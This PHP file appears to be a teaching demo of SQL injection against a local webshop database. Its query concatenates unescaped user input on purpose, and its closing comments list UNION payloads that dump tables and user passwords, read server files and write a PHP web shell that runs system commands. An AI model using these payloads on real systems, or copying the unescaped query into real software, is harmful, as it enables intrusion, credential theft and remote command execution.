    <form method="get" action="sqlinject.php">
    <div>
        <div id="rendelesek" style="float: left;">
            
        </div>
        <div>
            <div style="margin-left: 300px">
                <input type="text" name="param" style='width: 700px' />
                <input type="submit" value="Send" />
                <br />
                <div id="resdiv">
                </div>
            </div>
        </div>
    </div>
    </form>

<?php

  $param=trim($_GET["param"]);
  
  $dbhost = 'localhost';
  $dbuser = 'root';
  $dbpass = '';
  $dbname = 'webshop';
  $conn=mysqli_connect($dbhost,$dbuser,$dbpass);
  if(!$conn) die("MySQL connect error: ".mysqli_error());
  mysqli_select_db($dbname) or die("Database connect error: ".mysqli_error());
  mysqli_query('SET NAMES utf8');
  
  //$param=mysql_real_escape_string($param);
  
  if(strlen($param)>0) {
    $sql="SELECT id,nev,kep FROM termekek WHERE id IN (".$param.")";
    print $sql;
    $sqlresult=mysqli_query($sql);
    $html="<table border=1>";
    while($row=mysqli_fetch_row($sqlresult)) {
      $html.="<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td></tr>";
    }
    $html.="</table>";
    print $html;
  }
  // http://www.hackyeah.com/2010/05/hack-yeah-sql-injection-walkthrough-dvwa/
  // 0); #
  // 0) union all SELECT id,nev,kep FROM termekek; #
  // 0) UNION SELECT database(),'',''; #
  // 0) UNION select table_name,'','' from information_schema.tables where table_schema='webshop'; #
  // 0) UNION select table_schema,column_name,data_type from information_schema.columns where table_name='users'; #
  // 0) UNION select nev,username,password from users; #
  // 0) UNION SELECT load_file('C:\\xampp\\passwords.txt'),'',''; #
  // 0) UNION SELECT 'hello baby','','' INTO OUTFILE 'c:\\xampp\\htdocs\\testing2.txt'; #
  /* 0) UNION SELECT '','','<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\hack.php'; # */
  // localhost/hack.php?cmd=dir
  // localhost/hack.php?cmd=notepad.exe
  
?>


